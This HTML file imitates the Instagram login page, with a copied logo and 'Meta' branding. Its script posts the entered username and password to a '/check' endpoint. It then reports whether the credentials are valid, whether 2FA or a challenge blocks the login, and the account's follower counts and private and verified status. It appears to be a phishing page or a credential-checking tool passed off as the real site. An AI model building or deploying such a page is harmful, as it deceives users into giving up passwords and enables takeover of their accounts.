<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0 16px;
        }

        /* Instagram Logo - CSS-only gradient camera */
        .logo {
            width: 80px;
            height: 80px;
            margin-bottom: 60px;
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        .logo::before {
            content: '';
            width: 46px;
            height: 46px;
            border: 4px solid white;
            border-radius: 12px;
            position: absolute;
        }

        .logo::after {
            content: '';
            width: 18px;
            height: 18px;
            border: 4px solid white;
            border-radius: 50%;
            position: absolute;
        }

        .logo-dot {
            width: 6px;
            height: 6px;
            background: white;
            border-radius: 50%;
            position: absolute;
            top: 22px;
            right: 22px;
        }

        /* Form */
        .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .input-group {
            width: 100%;
        }

        .input-group input {
            width: 100%;
            padding: 16px 14px;
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
            color: #262626;
        }

        .input-group input:focus {
            border-color: #a8a8a8;
        }

        .input-group input::placeholder {
            color: #8e8e8e;
            font-size: 16px;
        }

        /* Login Button */
        .login-btn {
            width: 100%;
            padding: 14px 0;
            margin-top: 6px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .login-btn:hover:not(:disabled) {
            background: #166fe5;
        }

        .login-btn:disabled {
            background: #b2dffc;
            cursor: default;
        }

        /* Forgot Password */
        .forgot-password {
            color: #262626;
            text-decoration: none;
            font-size: 15px;
            margin-top: 18px;
            font-weight: 400;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        /* Divider */
        .divider {
            width: 100%;
            height: 1px;
            background: #dbdbdb;
            margin: 40px 0;
        }

        /* Create Account Button */
        .create-account-btn {
            width: 100%;
            padding: 14px 0;
            background: #ffffff;
            color: #1877f2;
            border: 1px solid #dbdbdb;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            text-align: center;
            display: block;
            transition: background 0.2s;
        }

        .create-account-btn:hover {
            background: #f5f5f5;
        }

        /* Meta Logo */
        .meta-logo {
            margin-top: 60px;
            display: flex;
            align-items: center;
            gap: 6px;
            color: #8e8e8e;
            font-size: 14px;
            font-weight: 500;
        }

        .meta-logo svg {
            width: 16px;
            height: 16px;
            fill: #8e8e8e;
        }

        /* Spinner */
        .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            vertical-align: middle;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* Toast / Result */
        .toast {
            display: none;
            margin-top: 14px;
            padding: 12px 16px;
            border-radius: 8px;
            font-size: 14px;
            text-align: left;
            line-height: 1.4;
            width: 100%;
        }

        .toast.valid {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .toast.warning {
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeeba;
        }

        .toast.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .toast strong {
            display: block;
            margin-bottom: 4px;
        }

        .acc-table {
            margin-top: 10px;
            width: 100%;
            font-size: 13px;
            border-collapse: collapse;
        }

        .acc-table td {
            padding: 4px 0;
            border-bottom: 1px solid rgba(0, 0, 0, 0.07);
        }

        .acc-table td:first-child {
            color: #8e8e8e;
            width: 50%;
        }

        .acc-table td:last-child {
            font-weight: 600;
            color: #262626;
        }

        .acc-table tr:last-child td {
            border-bottom: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Instagram Logo (CSS-only gradient camera) -->
        <div class="logo">
            <div class="logo-dot"></div>
        </div>

        <form class="login-form" id="loginForm">
            <div class="input-group">
                <input 
                    type="text" 
                    id="username" 
                    placeholder="Username, mobile number or email address" 
                    autocomplete="username"
                >
            </div>

            <div class="input-group">
                <input 
                    type="password" 
                    id="password" 
                    placeholder="Password" 
                    autocomplete="current-password"
                >
            </div>

            <button type="submit" class="login-btn" id="loginBtn" disabled>Log in</button>
        </form>

        <a href="#" class="forgot-password">Forgotten password?</a>

        <div class="divider"></div>

        <a href="#" class="create-account-btn">Create new account</a>

        <!-- Result Toast -->
        <div class="toast" id="toast"></div>

        <div class="meta-logo">
            <svg viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 0 0-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z"/>
            </svg>
            Meta
        </div>
    </div>

    <script>
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        const loginForm = document.getElementById('loginForm');
        const toast = document.getElementById('toast');

        function checkInputs() {
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();
            loginBtn.disabled = !(username.length > 0 && password.length > 0);
        }

        usernameInput.addEventListener('input', checkInputs);
        passwordInput.addEventListener('input', checkInputs);

        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();

            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();

            loginBtn.disabled = true;
            loginBtn.innerHTML = '<span class="spinner"></span>';
            toast.style.display = 'none';

            try {
                const res = await fetch('/check', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password }),
                });
                const data = await res.json();
                showToast(data);
            } catch {
                showToast({ success: false, message: 'Network error. Please try again.' });
            } finally {
                loginBtn.disabled = false;
                loginBtn.textContent = 'Log in';
            }
        });

        function showToast(data) {
            const status = data.status || '';
            const isWarning = ['2fa_required', 'challenge_required', 'recaptcha_challenge', 'contact_point_required'].includes(status);
            const isValid = data.success && !isWarning;

            toast.className = 'toast ' + (isValid ? 'valid' : isWarning ? 'warning' : 'error');
            toast.style.display = 'block';

            let label = isValid ? '✓ Valid credentials' : isWarning ? '⚠ Additional step required' : '✕ Login failed';
            let html = `<strong>${label}</strong>${esc(data.message || '')}`;

            if (data.account) {
                const a = data.account;
                html += `
                    <table class="acc-table">
                        <tr><td>Full name</td><td>${esc(a.full_name || '—')}</td></tr>
                        <tr><td>Username</td><td>@${esc(a.username || '—')}</td></tr>
                        <tr><td>Followers</td><td>${fmt(a.followers)}</td></tr>
                        <tr><td>Following</td><td>${fmt(a.following)}</td></tr>
                        <tr><td>Private</td><td>${a.is_private ? 'Yes' : 'No'}</td></tr>
                        <tr><td>Verified</td><td>${a.is_verified ? 'Yes' : 'No'}</td></tr>
                    </table>`;
            }

            toast.innerHTML = html;
        }

        function esc(s) {
            return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
        }

        function fmt(n) {
            return n != null ? Number(n).toLocaleString() : '—';
        }
    </script>
</body>
</html>
